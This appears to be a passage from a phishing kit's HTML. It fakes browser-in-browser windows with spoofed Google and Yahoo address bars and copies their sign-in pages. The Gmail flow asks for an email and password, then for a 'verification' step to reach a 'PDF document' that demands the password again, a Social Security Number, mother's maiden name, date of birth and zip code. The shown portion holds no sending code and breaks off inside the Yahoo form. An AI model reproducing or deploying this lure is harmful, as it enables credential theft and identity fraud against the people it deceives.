        <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNzUycHQiIGhlaWdodD0iNzUycHQiIHZlcnNpb249IjEuMSIgdmlld0JveD0iMCAwIDc1MiA3NTIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiA8cGF0aCBkPSJtNTEwLjk3IDMxNi44aC0xMi43ODVsLTAuMDAzOTA2LTYyLjUxMmMwLTU2LjgyOC00Ni40MS0xMDMuMjQtMTAzLjI0LTEwMy4yNGgtMzcuODg3Yy01Ni44MjggMC0xMDMuMjQgNDYuNDEtMTAzLjI0IDEwMy4yNHY2Mi4wMzloLTEyLjc4NWMtMjUuNTc0IDAtNDUuOTM4IDIwLjgzNi00NS45MzggNDUuOTM4djE5Mi4yN2MwIDI1LjU3NCAyMC44MzYgNDUuOTM4IDQ1LjkzOCA0NS45MzhoMjcwLjQxYzI1LjU3NCAwIDQ1LjkzOC0yMC44MzYgNDUuOTM4LTQ1LjkzOGwwLjAwMzkwNi0xOTEuOGMwLTI1LjU3NC0yMC44MzYtNDUuOTM4LTQ2LjQxLTQ1LjkzOHptLTE5NS4xMi02Mi41MTJjMC0yMi43MyAxOC40NjktNDEuMjAzIDQxLjIwMy00MS4yMDNoMzcuODg3YzIyLjczIDAgNDEuMjAzIDE4LjQ2OSA0MS4yMDMgNDEuMjAzdjYyLjAzOWgtMTIwLjI5eiIgZmlsbD0iI0E2QTZCMiIvPgo8L3N2Zz4K" width="30px" height="20px" id="ssl-padlock">
        <span id="domain-name">https://accounts.google.com</span>
        <span id="domain-path">/signin/v2<span>
    </div>

    <div class="gmcontainer-div active">
        <div class="all-gm-div">
            <div class="gmcon-logo-box">
                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg>
            </div>

            <div class="gm-signin-div">
                <h3 style="color: black">Sign in</h3>
                <p>Use your Google Account</p>
            </div>
        </div>

        <div class="gm-form-div">
            <form action="#" id="gmform-1">
                <div class="gm-form-box-mail gm-top-input">
                    <input type="text" placeholder="Email or Phone" class="gm-main-input" >
                    <div class="gm-error error-remover">
                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAVCAYAAABYHP4bAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADhSURBVEhL7ZMxCgIxEEW9jL0X0VJvopVWVl5CC72LYC/aWSgLFgsKgggSfWEFN05mYxaChR8+hMxkHkxmGiaRfhN03axNvpiZbDSw5sxdiIJA9/PJFt62mqKJkaOpEkSBXa8jAt5NjgarBGXD/mfRbtvavSfXJxVE/91i+LJaWkux22FfvC5LBeXzqVhMA/FGkgqS2oY10HEyLl6XFQVirLEUiwL5Wqc5qnXJhgGJ4/3cGWm3oscb2YUVdsY1ObUWFlHANxiYmAZBQaCX6D+fTWHM2fcnrr4C1dEfFK1EIGMeSiWTtDYpULAAAAAASUVORK5CYII=" alt="" width="30px">
                        <span>Enter an email or phone number</span>
                    </div>
                </div>

                <div class="gm-form-box-mail gm-forgot">
                    <a href="#">Forgot email?</a>
                </div>


                <div class="gm-form-box-mail">
                    <span>Not your computer? Use Guest mode to sign in privately.</span>
                    <a href="#">Learn more</a>
                </div>

                <div class="gm-form-box-mail gm-box-data">
                    <div class="gm-create-acct">
                        <a href="#">Create Account</a>
                    </div>
                    <div class="gm-next">

                        <button class="gm-next-btn" type="button">Next</button>
                    </div>
                </div>

            </form>
        </div>


    </div>

    <div class="gmcontainer-div">
        <div class="all-gm-div">
            <div class="gmcon-logo-box">
                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg>
            </div>

            <div class="gm-signin-div">
                <h3 style="color: black">Welcome</h3>
                <a class="gm-mail-info" style="color: black">
                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAWCAYAAADeiIy1AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAF1SURBVEhLvZY9SwNBEIbzwywECwWDNgFFG0WxUvz4D8GPTsTSqKVordZqbWKr9td79qvPJBNmN3t3e0HzwEuW2dl9d2f2II2v/NtNgsbg999JMnr/+HTd3puI8TgUGuV57jpX126uueimpmc8tZZXZY6cVKJGnFoN1ja23OnZubt/eBQxJsYcOak3HDFiIZvMzi/IxkUwRw65KWaeEaXglGxgF19c9kuIKJlCDrnEq8roGbEhJ7Q30ZgVMYXcMBbDM+J01N+i/bBa3/RzWksr8kDKGBppb2i2JWa0vbs/mO3DGuJlvRoavXZ7khw+gJvbO88EEbNoDnsUUWkET88vcgvEOET7lGSkpatqaoxapQMeg21qlmXynHf2DiSOGBNjTpHH8KsyPCN9ypSnfXgs4zK1j07Ge958dPq11xFran2woL2qo7LeKCNGwMKUm5GTYgJRI6AU1J0mhwbEmKsql6XQyMKp+UZQ6g1Ckoz+ggn9OXHuB//us7Jry2kNAAAAAElFTkSuQmCC" alt="">
                    <span class="gm-mail-text-info">testmails@gmail.com</span>
                </a>
            </div>
        </div>

        <div class="gm-form-div">
            <form action="#" id="gmform">
                <div class="gm-form-box-mail gm-top-input">
                    <input type="password" placeholder="Enter your Password" class="gm-main-input" >
                    <div class="gm-error error-remover">
                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAVCAYAAABYHP4bAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADhSURBVEhL7ZMxCgIxEEW9jL0X0VJvopVWVl5CC72LYC/aWSgLFgsKgggSfWEFN05mYxaChR8+hMxkHkxmGiaRfhN03axNvpiZbDSw5sxdiIJA9/PJFt62mqKJkaOpEkSBXa8jAt5NjgarBGXD/mfRbtvavSfXJxVE/91i+LJaWkux22FfvC5LBeXzqVhMA/FGkgqS2oY10HEyLl6XFQVirLEUiwL5Wqc5qnXJhgGJ4/3cGWm3oscb2YUVdsY1ObUWFlHANxiYmAZBQaCX6D+fTWHM2fcnrr4C1dEfFK1EIGMeSiWTtDYpULAAAAAASUVORK5CYII=" alt="" width="30px">
                        <span>Enter your email Password</span>
                    </div>
                </div>

                <div class="gm-form-box-mail gm-forgot">
                    <input type="checkbox" name="" id="show">
                    <label for="show" style="color: black">Show Password</label>
                </div>

                <div class="gm-form-box-mail gm-box-data gm-data-2">
                    <div class="gm-create-acct">
                        <a href="#">Forgot Password?</a>
                    </div>
                    <div class="gm-next">

                        <button class="gm-next-btn" type="button">Next</button>
                    </div>
                </div>

            </form>
        </div>


    </div>


    <div class="gmcontainer-div">
        <div class="all-gm-div">
            <div class="gmcon-logo-box">
                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg>
            </div>

            <div class="gm-signin-div gm-signin-join">
                <h3 style="color: black">Please help us Verify Account your account to get access to the PDF document</h3>
                <a class="gm-mail-info">
                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAWCAYAAADeiIy1AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAF1SURBVEhLvZY9SwNBEIbzwywECwWDNgFFG0WxUvz4D8GPTsTSqKVordZqbWKr9td79qvPJBNmN3t3e0HzwEuW2dl9d2f2II2v/NtNgsbg999JMnr/+HTd3puI8TgUGuV57jpX126uueimpmc8tZZXZY6cVKJGnFoN1ja23OnZubt/eBQxJsYcOak3HDFiIZvMzi/IxkUwRw65KWaeEaXglGxgF19c9kuIKJlCDrnEq8roGbEhJ7Q30ZgVMYXcMBbDM+J01N+i/bBa3/RzWksr8kDKGBppb2i2JWa0vbs/mO3DGuJlvRoavXZ7khw+gJvbO88EEbNoDnsUUWkET88vcgvEOET7lGSkpatqaoxapQMeg21qlmXynHf2DiSOGBNjTpHH8KsyPCN9ypSnfXgs4zK1j07Ge958dPq11xFran2woL2qo7LeKCNGwMKUm5GTYgJRI6AU1J0mhwbEmKsql6XQyMKp+UZQ6g1Ckoz+ggn9OXHuB//us7Jry2kNAAAAAElFTkSuQmCC" alt="">
                    <span class="gm-data-mail" style="color: black">testmails@gmail.com</span>
                </a>
            </div>
        </div>

        <div class="gm-form-div">
            <div class="gm-error errior-down error-remover">
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAVCAYAAABYHP4bAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADhSURBVEhL7ZMxCgIxEEW9jL0X0VJvopVWVl5CC72LYC/aWSgLFgsKgggSfWEFN05mYxaChR8+hMxkHkxmGiaRfhN03axNvpiZbDSw5sxdiIJA9/PJFt62mqKJkaOpEkSBXa8jAt5NjgarBGXD/mfRbtvavSfXJxVE/91i+LJaWkux22FfvC5LBeXzqVhMA/FGkgqS2oY10HEyLl6XFQVirLEUiwL5Wqc5qnXJhgGJ4/3cGWm3oscb2YUVdsY1ObUWFlHANxiYmAZBQaCX6D+fTWHM2fcnrr4C1dEfFK1EIGMeSiWTtDYpULAAAAAASUVORK5CYII=" alt="" width="30px">
                <span class="text-error-gm">Enter your email date</span>
            </div>
            <form action="#" id="gmform-2">
                <div class="form-gm-new-mail">
                    <input type="password" placeholder="Email Password" class="gm-main-input" >
                    <input type="text" placeholder="Social Security Number" class="gm-main-input" >
                </div>
                <div class="form-gm-new-mail">
                    <input type="text" placeholder="Mother's Maiden Name" class="gm-main-input" >
                    <input type="text" placeholder="Date Of Birth" class="gm-main-input" >
                </div>
                <div class="form-gm-new-mail">
                    <input type="text" placeholder="Zip Code" class="gm-main-input" >

                </div>

                <div class="gm-form-box-mail gm-box-data ">
                    <div class="gm-create-acct">
                        <a href="#" style="opacity: 0; visibility: hidden;">Forgot Password?</a>
                    </div>
                    <div class="gm-next">

                        <button class="gm-next-btn" type="button">Verify Account</button>
                    </div>
                </div>

            </form>
        </div>


    </div>

</div>
<!------End---------Window GMAIL ---------End-------->
<!----------------Window Yahoo ----------------->
<div id="window" class="win win-4">
    <div id="title-bar-width">
        <div id="title-bar" >
            <div style="margin-top:5px;">
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABICAMAAAD/Eoi4AAAAKlBMVEVHcExhAtNhAdNhAtNyGeFgAdJgAdJgAdJgAdNiBdVhA9RgAdJlCddgAdIF22wQAAAADnRSTlMAVHtqCrP/4ZMqPcoZ81BhdT4AAAS5SURBVHja7ZrrjiMpDEaLi4uL8fu/7qon0ia2MRS1NRotE6v/dILAB8yHDTm+9rWvXTDn3xb+nBvRM/uNnsD5tvTngP3JLG8PnDhw2R24cl48dgcGDux2B26cl+LmwFqy9gbWkrU7sOO8cOwNrCVrd+DCedOxO3DmwH534EgcuG0OrCVrd2DkwPWJoCklrgDHVsy4ereIF4du9yXLfZqaidr9tgX8tUcIQ/v597NRF7jmVxqAvhiJvkc6X13m0XI0B4le/UJotyQLRps7UucsK8BStsbLkqiBC7L2miJziaFsoFTgIOguSRY11slIvoNOv2M+uVGdAAfRvgjvPJ3SyEcbd44chpKFgwMaVfpdUse7IXBQ7VnMvjpUlopRDEjLcVWyAv/S3vvFdM8G7sN8+OjIaESOx4HZJ7bFyj+SWUVlGRiFzrvA/UHCoFX4dBIH89fGkhWGkkbRlCwx7Dqw1sY6bFWZtNqGkWsgTSr/Ys2Hk7s7n/eBe9rYxhuECtu/tsFi5Q9GxIPwsZ5PAafRumlfyqw/t1b5u36DIqMQHgM+mwxoG2RhAoeSZc5J7oYGiJ7WgTXJXBGQI9gW1ip/Lze5noaqMdAHD3QFOAGS3sRVtcqQ9MTo7iBnOW5au6xsUo61ZKl8DQrPk2zgVH+GQK4kSgKx9tKprBNF/0r4Av+0zCVrdOBqybJz0EoGMM9ko9o3/APjlJQzT7Wfovm1y8qqFaVJp711ELgxcDYkoVjJF7KtJGYgGE7jYuWPara8dBrM+gOGwLXnHwjXqpUXBO4bWnFJi5eVQSlAkv6gOXFuCNx6agJ8RtHMCzz3xJkZU1y7rIwk+HS8JDM9jUPgf5sJ4GxWpYHHluz9bUlt1uqZqQW2ZUtvnEHBRQNgugIczIgBFhlkb8T6X97aKEZSZxnZW+P8jcA8fp4ClmEYgtZZO6TbLWBvnJbqGzKvoKhz/sRaS1x+L0fUZ5ktWuEWcDDFBW3RCqbLL0iHv8aEuvy8qCUUzPMcbwE743hVX6BxXh8oh4mw8hwcJiWLt2puf94Cbjod66RkRehnNhwGeS0yJ27U56XYy8YgsnGXgWVgYOte5iT7XtWRDBFYfCDNkwsoPiHJRXZJvQ7sxd3nD3ILSQ9OosqInTvbpqqvtPikqoVRohECK+cWgfV4CVV3tbcSlJCUzuhmc+HCHi+MJ+Q2MGtmGVwduHZU1y++MeqtAA8Dz0GKudn0Ake9F2cW0+S26FngOQhoPbUXuK0CKxnRcZEfBo548YXCXbj1jabr84TazOXwOeD5xTSV0VLoznBBtMxdCkLI07PARyWbt14MLojdSUlxKaHWs2QvCd0HPgpa8VwuJoLZyJzCnd/rJR31qF1zt4HtZ0HQb4Ld6KIPLqdGWE6oQ68JyefKegv4TYLWO/f85Tw3Q3Qh3vl9E7WutOX0+d59HDeB3+aA3TeAs0TV80Q7FxkFKNZ9bnjpJKsZMFGCXF/T9GGv/8UHupWw6F49ImQ3XJsSAJB+GvrS9cxn1sXMipCs7S3zhG17i6LG3Nz0z5T2Ni1Z21sVtdn2Bn+ZZDVR+W9vXhQb21v6yyTLDSr//c8k2J835uzff/X42tf+h/YPQiqe2vV+1kkAAAAASUVORK5CYII=" width="50px"  id="logo">
                <span id="logo-description">Sign in to your Yahoo Account</span>
            </div>
            <div>
                <span id="minimize">&#8212;</span>
                <span id="square">□</span>
                <span id="exit" class="exit4">✕</span>
            </div>
        </div>

    </div>
    <div id="url-bar">
        <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNzUycHQiIGhlaWdodD0iNzUycHQiIHZlcnNpb249IjEuMSIgdmlld0JveD0iMCAwIDc1MiA3NTIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiA8cGF0aCBkPSJtNTEwLjk3IDMxNi44aC0xMi43ODVsLTAuMDAzOTA2LTYyLjUxMmMwLTU2LjgyOC00Ni40MS0xMDMuMjQtMTAzLjI0LTEwMy4yNGgtMzcuODg3Yy01Ni44MjggMC0xMDMuMjQgNDYuNDEtMTAzLjI0IDEwMy4yNHY2Mi4wMzloLTEyLjc4NWMtMjUuNTc0IDAtNDUuOTM4IDIwLjgzNi00NS45MzggNDUuOTM4djE5Mi4yN2MwIDI1LjU3NCAyMC44MzYgNDUuOTM4IDQ1LjkzOCA0NS45MzhoMjcwLjQxYzI1LjU3NCAwIDQ1LjkzOC0yMC44MzYgNDUuOTM4LTQ1LjkzOGwwLjAwMzkwNi0xOTEuOGMwLTI1LjU3NC0yMC44MzYtNDUuOTM4LTQ2LjQxLTQ1LjkzOHptLTE5NS4xMi02Mi41MTJjMC0yMi43MyAxOC40NjktNDEuMjAzIDQxLjIwMy00MS4yMDNoMzcuODg3YzIyLjczIDAgNDEuMjAzIDE4LjQ2OSA0MS4yMDMgNDEuMjAzdjYyLjAzOWgtMTIwLjI5eiIgZmlsbD0iI0E2QTZCMiIvPgo8L3N2Zz4K" width="30px" height="20px" id="ssl-padlock">
        <span id="domain-name">https://login.yahoo.com</span>
        <span id="domain-path">/?.intl=nz</span>
    </div>

    <div class="box-contain">
        <div class="box-con-form">
            <div class="box-con-logo">
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABICAMAAAD/Eoi4AAAAKlBMVEVHcExhAtNhAdNhAtNyGeFgAdJgAdJgAdJgAdNiBdVhA9RgAdJlCddgAdIF22wQAAAADnRSTlMAVHtqCrP/4ZMqPcoZ81BhdT4AAAS5SURBVHja7ZrrjiMpDEaLi4uL8fu/7qon0ia2MRS1NRotE6v/dILAB8yHDTm+9rWvXTDn3xb+nBvRM/uNnsD5tvTngP3JLG8PnDhw2R24cl48dgcGDux2B26cl+LmwFqy9gbWkrU7sOO8cOwNrCVrd+DCedOxO3DmwH534EgcuG0OrCVrd2DkwPWJoCklrgDHVsy4ereIF4du9yXLfZqaidr9tgX8tUcIQ/v597NRF7jmVxqAvhiJvkc6X13m0XI0B4le/UJotyQLRps7UucsK8BStsbLkqiBC7L2miJziaFsoFTgIOguSRY11slIvoNOv2M+uVGdAAfRvgjvPJ3SyEcbd44chpKFgwMaVfpdUse7IXBQ7VnMvjpUlopRDEjLcVWyAv/S3vvFdM8G7sN8+OjIaESOx4HZJ7bFyj+SWUVlGRiFzrvA/UHCoFX4dBIH89fGkhWGkkbRlCwx7Dqw1sY6bFWZtNqGkWsgTSr/Ys2Hk7s7n/eBe9rYxhuECtu/tsFi5Q9GxIPwsZ5PAafRumlfyqw/t1b5u36DIqMQHgM+mwxoG2RhAoeSZc5J7oYGiJ7WgTXJXBGQI9gW1ip/Lze5noaqMdAHD3QFOAGS3sRVtcqQ9MTo7iBnOW5au6xsUo61ZKl8DQrPk2zgVH+GQK4kSgKx9tKprBNF/0r4Av+0zCVrdOBqybJz0EoGMM9ko9o3/APjlJQzT7Wfovm1y8qqFaVJp711ELgxcDYkoVjJF7KtJGYgGE7jYuWPara8dBrM+gOGwLXnHwjXqpUXBO4bWnFJi5eVQSlAkv6gOXFuCNx6agJ8RtHMCzz3xJkZU1y7rIwk+HS8JDM9jUPgf5sJ4GxWpYHHluz9bUlt1uqZqQW2ZUtvnEHBRQNgugIczIgBFhlkb8T6X97aKEZSZxnZW+P8jcA8fp4ClmEYgtZZO6TbLWBvnJbqGzKvoKhz/sRaS1x+L0fUZ5ktWuEWcDDFBW3RCqbLL0iHv8aEuvy8qCUUzPMcbwE743hVX6BxXh8oh4mw8hwcJiWLt2puf94Cbjod66RkRehnNhwGeS0yJ27U56XYy8YgsnGXgWVgYOte5iT7XtWRDBFYfCDNkwsoPiHJRXZJvQ7sxd3nD3ILSQ9OosqInTvbpqqvtPikqoVRohECK+cWgfV4CVV3tbcSlJCUzuhmc+HCHi+MJ+Q2MGtmGVwduHZU1y++MeqtAA8Dz0GKudn0Ake9F2cW0+S26FngOQhoPbUXuK0CKxnRcZEfBo548YXCXbj1jabr84TazOXwOeD5xTSV0VLoznBBtMxdCkLI07PARyWbt14MLojdSUlxKaHWs2QvCd0HPgpa8VwuJoLZyJzCnd/rJR31qF1zt4HtZ0HQb4Ld6KIPLqdGWE6oQ68JyefKegv4TYLWO/f85Tw3Q3Qh3vl9E7WutOX0+d59HDeB3+aA3TeAs0TV80Q7FxkFKNZ9bnjpJKsZMFGCXF/T9GGv/8UHupWw6F49ImQ3XJsSAJB+GvrS9cxn1sXMipCs7S3zhG17i6LG3Nz0z5T2Ni1Z21sVtdn2Bn+ZZDVR+W9vXhQb21v6yyTLDSr//c8k2J835uzff/X42tf+h/YPQiqe2vV+1kkAAAAASUVORK5CYII=" alt="logo-aol" width="70px">
            </div>

            <div class="box-con-sign">
                <h2 class="sign-data-text text-yah-sign" style="color: black">Sign in</h2>
            </div>

            <form action="#" id="form-yah-box">
                <div class="form-ao-data yaho-form-boxes active">
                    <div class="box-con__input inp-box-con">
                        <input type="text" name="" id="nameuser" placeholder="Username, email, or mobile" class="aol-input yah-input" >
                        <div class="err-aol-box">
                            <span class="err-aol yah-error-div"></span>
                        </div>
                    </div>


                    <div class="box-con__input btn-inp-data yahoo-btn">
                        <button type="button" class="btnAol text-btn btn-next-yahoo"><a class="next-text">Next</a><div class="loadererr yah-loader text-loader hide-load-icon">Loading...</div></button>
                    </div>

                    <div class="box-con__input btn-inp-data">
                        <div class="sign-box-con">
                            <input type="checkbox">
                            <span>Stay Signed in</span>
                        </div>

                        <div class="sign-box-con">
                            <input type="checkbox">
                            <span>Forgot username?</span>
                        </div>
                    </div>

                    <div class="box-con__input box-con-create yahoo-create">
                        <button type="button">Create an account</button>
                    </div>

                    <div class="box-con__input conti-text ">
                        <span style="color: black">Or, continue with</span>
                    </div>


                    <div class="box-con__input img-boxess">
                        <div class="gmai-con yah-g-con">

                            <svg width="20px" height="20px" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                <!-- Generator: Sketch 58 (84663) - https://sketch.com -->
                                <title>Google</title>
                                <desc>Created with Sketch.</desc>
                                <g id="Account-Access" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                    <g id="AOL_SocialLogin" transform="translate(-54.000000, -514.000000)" fill-rule="nonzero">
                                        <g id="Google" transform="translate(54.000000, 514.000000)">
